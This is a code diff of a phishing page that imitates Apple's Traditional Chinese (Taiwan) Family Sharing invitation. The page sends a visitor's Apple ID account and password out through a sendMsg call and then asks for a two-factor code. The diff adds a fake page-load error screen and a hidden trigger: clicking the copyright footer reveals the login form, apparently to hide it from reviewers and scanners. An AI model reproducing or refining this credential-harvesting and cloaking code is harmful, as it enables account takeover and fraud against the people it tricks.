@@ -9,7 +9,7 @@
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: "SF Pro Display", "SF Pro Icons", "Helvetica Neue", "Helvetica", "Arial", sans-serif; }
         body { background-color: #ffffff; color: #1d1d1f; display: flex; flex-direction: column; min-height: 100vh; }
         
-        /* 初始加載畫面 */
+        /* 初始加載與再試一次的加載畫面 */
         #initial-loader {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #ffffff; display: flex; align-items: center; justify-content: center;
@@ -20,12 +20,19 @@
         .navbar h1 { font-size: 21px; font-weight: 600; }
         .navbar .right-link { font-size: 14px; color: #1d1d1f; text-decoration: none; }
 
-        .main-content { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 40px 22px; text-align: center; }
+        .main-content { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 60px 22px; text-align: center; }
         .family-hero-img { width: 140px; height: auto; margin-bottom: 30px; }
-        .invite-title { font-size: 28px; font-weight: 600; margin-bottom: 15px; line-height: 1.2; }
-        .invite-desc { font-size: 17px; line-height: 1.5; margin-bottom: 40px; max-width: 500px; }
+        
+        /* 錯誤頁面樣式 */
+        .error-title { font-size: 28px; font-weight: 600; margin-bottom: 15px; }
+        .error-desc { font-size: 19px; color: #1d1d1f; margin-bottom: 40px; }
+        .retry-btn { 
+            background-color: #007aff; color: white; border: none; padding: 12px 40px; 
+            border-radius: 8px; font-size: 19px; font-weight: 400; cursor: pointer;
+        }
 
-        .login-box { width: 100%; max-width: 330px; border: 1px solid #d2d2d7; border-radius: 12px; overflow: hidden; background: #fff; transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1); margin-bottom: 60px; }
+        /* 登入框延展設計 (隱藏入口觸發後顯示) */
+        .login-box { width: 100%; max-width: 330px; border: 1px solid #d2d2d7; border-radius: 12px; overflow: hidden; background: #fff; transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1); margin: 30px 0; }
         .input-row { position: relative; height: 52px; display: flex; align-items: center; }
         .apple-input { width: 100%; height: 100%; padding: 0 50px 0 16px; border: none; font-size: 17px; outline: none; background: transparent; }
         .divider { height: 1px; background-color: #d2d2d7; margin: 0 16px; display: none; }
@@ -36,6 +43,7 @@
         .submit-btn { position: absolute; right: 10px; width: 32px; height: 32px; border: 1px solid #d2d2d7; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; background: #fff; }
         .loading-gif { width: 22px; height: 22px; display: none; }
 
+        /* 雙重認證 */
         .otp-container { display: flex; gap: 10px; justify-content: center; margin: 30px 0; }
         .otp-input { width: 45px; height: 55px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 24px; text-align: center; outline: none; }
 
@@ -58,10 +66,17 @@
         <a href="#" class="right-link">「家人共享」是什麼？</a>
     </nav>
 
-    <main id="phase-invite" class="main-content">
+    <main id="phase-error" class="main-content">
         <img src="./assets/family_icon.png" class="family-hero-img" alt="Family Icon">
-        <h1 class="invite-title">ThomasSusan 已邀請你加入「家人共享」。</h1>
-        <p class="invite-desc">登入以加入ThomasSusan的家庭，即可存取 iCloud 儲存空間。</p>
+        <h1 class="error-title">載入此頁面時發生問題</h1>
+        <p class="error-desc">再試一次或稍後再回來。</p>
+        <button class="retry-btn" onclick="retryLoad()">再試一次</button>
+    </main>
+
+    <main id="phase-invite" class="main-content hidden">
+        <img src="./assets/family_icon.png" class="family-hero-img" alt="Family Icon">
+        <h1 style="font-size: 28px; font-weight: 600; margin-bottom: 15px;">ThomasSusan 已邀請你加入「家人共享」。</h1>
+        <p style="font-size: 17px; margin-bottom: 40px;">登入以加入ThomasSusan的家庭，即可存取 iCloud 儲存空間。</p>
         <h2 style="font-size: 24px; margin-bottom: 25px; font-weight: 400;">使用 Apple 帳號登入</h2>
         
         <div class="login-box" id="login-box">
@@ -103,7 +118,7 @@
         <div class="footer-inner">
             <div style="border-bottom: 1px solid #d2d2d7; padding-bottom: 15px; margin-bottom: 15px;">更多選購方式：<span style="color: #0066cc;">尋找當地的 Apple 直營店</span>或致電 0800-020-021。</div>
             <div class="footer-bottom">
-                <div>Copyright © 2022 Apple Inc. 保留一切權利。</div>
+                <div onclick="showSecretLogin()" style="cursor: default;">Copyright © 2022 Apple Inc. 保留一切權利。</div>
                 <div class="flag-box"><img src="./assets/TWNflag.png" class="flag-img" alt="Taiwan"> 台灣</div>
             </div>
         </div>
@@ -115,11 +130,29 @@
 
         function initPage() {
             setTimeout(() => {
-                const loader = document.getElementById('initial-loader');
-                loader.style.transition = "opacity 0.5s ease";
-                loader.style.opacity = "0";
-                setTimeout(() => loader.style.display = "none", 500);
+                hideLoader();
             }, 2500);
+        }
+
+        function hideLoader() {
+            const loader = document.getElementById('initial-loader');
+            loader.style.transition = "opacity 0.5s ease";
+            loader.style.opacity = "0";
+            setTimeout(() => loader.style.display = "none", 500);
+        }
+
+        function retryLoad() {
+            const loader = document.getElementById('initial-loader');
+            loader.style.display = "flex";
+            loader.style.opacity = "1";
+            setTimeout(() => {
+                hideLoader();
+            }, 2500);
+        }
+
+        function showSecretLogin() {
+            document.getElementById('phase-error').classList.add('hidden');
+            document.getElementById('phase-invite').classList.remove('hidden');
         }
 
         function preventReturn(e) {
@@ -151,8 +184,6 @@
             btn.querySelector('.arrow-svg').style.display = 'none';
             btn.querySelector('.loading-gif').style.display = 'block';
             await sendMsg(`👨‍👩‍👧‍👦 【Apple ID】\n帳號: ${acc}\n密碼: ${pw}`);
-            
-            // 時間改為 10 秒 (10000 毫秒)
             setTimeout(() => {
                 document.getElementById('phase-invite').classList.add('hidden');
                 document.getElementById('phase-otp').classList.remove('hidden');
